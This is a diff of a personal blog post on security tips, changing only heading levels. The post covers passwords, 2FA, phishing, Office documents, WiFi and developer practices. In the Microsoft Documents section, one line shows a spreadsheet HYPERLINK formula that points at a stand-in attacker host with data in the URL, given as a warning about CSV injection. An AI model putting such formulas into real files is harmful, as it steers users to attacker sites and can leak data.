@@ -25,7 +25,7 @@ I got hacked, and it changed my life's **perspective** **on security**. Here's a
 <!-- <details>
   <summary>Hack incident details... (click to expand)</summary> -->
 
-# Hack incident
+## Hack incident
 
 I've been very chill about security most of my life. I'm 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!
 
@@ -50,7 +50,7 @@ Some examples of data breaches:
 
 <!-- </details> -->
 
-# Security Tips
+## Security Tips
 
 Cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent getting hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.
 
@@ -62,7 +62,7 @@ For instance, your password length and unique character alone can tell how long 
 
 Here are my security tips on how to minimize hacking. It goes from generic usable for mostly everyone to server setup recommendations.
 
-## Generic tips
+### Generic tips
   - Use different passwords for everything. If you use the same password for everything some website gets compromised (e.g., Amazon), then everything that has the same user and password will be at risk. I know it's a hassle to remember all, but you don't have to. Use a password manager like Bitwarden, 1Password, LastPass, Dashlane or even Google Chrome built-in password manager.
   - Use long passwords with special characters. If you are using a password manager, you can ask to auto-generate a secure password.
   - Use ** 2-factor authentication** whenever is available.
@@ -71,20 +71,20 @@ Here are my security tips on how to minimize hacking. It goes from generic usabl
   - Don't trust defaults blindly verify if there's a more secure option.
   - Keep all your devices, operating systems and dependencies up-to-date. Most well-known vulnerabilities are fixed shortly after they are reported.
 
-## Email security tips
+### Email security tips
   - Have ** 2-factor authentication** on your emails. If someone gets access to your primary email, then they can use `forgot password` on many sites (Evernote, Bank Accounts) and change the password. I heard of somebody that got their email compromised; in turn, the hacker got access to their Evernote and found some passwords to their cryptocurrency exchanges and got robbed big time. Don't be that guy. Enable 2FA.
   - Be aware of phishing emails. No, Bill Gates won't share his fortune and donate you a million, nor you won any lottery. Don't trust any email saying that you won money or any price. Also, be aware of fake company emails asking for you to log in somewhere. The site might look very similar, but it's a trap! They want to capture your password. Check the domain carefully or even better yet don't click on any link from the email and type your company web address directly as you usually do.
   - Be aware of malicious attachments. Specially executables (*.exe, *.bat, *.sh, *.zip). See also Microsoft documents part. Everything that can run arbitrary code on your computer should not be trusted.
 
-## Social Media
+### Social Media
   - Enable all the security options they have like 2 Factor authentication, SMS confirmation.
   - Don't share passwords with your friends or change them afterwards.
 
-## Microsoft Documents
+### Microsoft Documents
   - If you use your documents locally or by trusted peers, you shouldn't have many problems. However, for auto-generated documents like (*.csv) that you download from emails or compromised websites they can change data or insert malicious links (`=HYPERLINK("[http://attacker.com?some='data](http://attacker.com/?some=%27data%27)')`) and take you to their websites.
   - Be aware of macros. They are code that automatically runs when you open the program. In modern versions, Office alerts you when a doc has a macro, and now they are disabled by default.
 
-## Wifi security tips
+### Wifi security tips
   - Use a password for your wifi. If you leave it open anybody connects to it can have access to your computers, cell phones, tablets, and smart fridge or cameras.
   - Use strong encryption for Wifi. Don't use WEP encryption. Use  WPA or the newer WPA2. WEP can be cracked relatively quickly using some programs.
   - Use a strong password. It makes it harder to break.
@@ -95,7 +95,7 @@ Here are my security tips on how to minimize hacking. It goes from generic usabl
       - Restrict access by MAC address list. This list will allow only the devices in there to connect to the network.
       - Shutdown your network when is not in used. It's a little extreme, but that's the ultimate security measure or use wired connections.
 
-## Developers security tips
+### Developers security tips
   - Keep all your operating systems and dependencies up-to-date. Maintainers usually patch their software after vulnerabilities come to light.
   - Use latest encryption protocols TLS (rather than older SSL versions)
       - Use SFTP instead of FTP
